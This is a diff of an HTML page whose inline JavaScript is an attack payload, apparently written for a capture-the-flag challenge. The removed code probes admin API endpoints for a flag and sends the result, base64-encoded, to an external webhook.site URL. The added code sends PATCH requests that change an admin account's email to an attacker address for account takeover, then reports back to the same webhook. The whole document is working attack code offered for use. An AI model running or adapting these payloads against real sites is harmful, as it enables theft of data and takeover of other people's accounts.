@@ -2,47 +2,35 @@
 <html>
 <body>
 <script>
-    async function internalLeak() {
-        const webhook = "https://webhook.site/cba69682-a819-449d-9c60-6326cbf644eb";
-        
-        // List of high-value endpoints to check for the flag
-        const secretEndpoints = [
-            '/api/admin/flag',
-            '/api/auth/me',
-            '/api/system/config',
-            '/api/admin/settings'
+    const webhook = "https://webhook.site/cba69682-a819-449d-9c60-6326cbf644eb";
+    
+    async function performATO() {
+        // Try to change the email to one you control
+        // If the email changes, you can then trigger a "Forgot Password"
+        const endpoints = [
+            '/api/auth/profile',
+            '/api/auth/account',
+            '/api/admin/users/update'
         ];
 
-        let foundData = "No flag found in common endpoints";
-
-        for (let url of secretEndpoints) {
+        for (let url of endpoints) {
             try {
-                let response = await fetch(url);
-                if (response.ok) {
-                    let text = await response.text();
-                    if (text.length > 5) { // Ensure we got actual data
-                        foundData = `${url}: ${text}`;
-                        break; // Stop at the first one that works
-                    }
-                }
+                await fetch(url, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        "id": "69d28e841cda77b519a9550e", // Admin ID
+                        "email": "yourname@attacker.com", // CHANGE THIS TO YOUR EMAIL
+                        "fullName": "ATO_IN_PROGRESS"
+                    })
+                });
             } catch (e) {}
         }
-
-        // LEAK 1: External (Might be blocked, but good to try)
-        fetch(`${webhook}?leaked=${btoa(foundData)}`);
-
-        // LEAK 2: Internal (The bypass)
-        // We write the flag into the admin's profile field 'phoneNumber'
-        await fetch('/api/auth/profile', {
-            method: 'PATCH',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                "phoneNumber": foundData.substring(0, 100),
-                "fullName": "LOOK_AT_PHONE_FIELD"
-            })
-        });
+        
+        // Signal the webhook that the attempt is finished
+        fetch(webhook + "?status=ATO_Attempted");
     }
-    internalLeak();
+    performATO();
 </script>
 </body>
 </html>
